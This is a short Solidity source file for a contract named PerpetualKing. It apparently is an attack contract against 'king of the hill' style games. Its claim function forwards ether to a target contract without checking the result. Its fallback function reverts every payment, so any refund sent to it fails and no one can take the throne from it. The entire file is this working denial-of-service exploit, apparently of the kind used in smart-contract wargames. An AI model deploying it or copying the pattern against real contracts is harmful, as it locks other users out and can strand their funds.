pragma solidity ^0.5.0;

contract PerpetualKing {

    function claim(address payable target) external payable {
        target.call.value(msg.value)('');
    }

    function() external payable {
        revert();
    }
}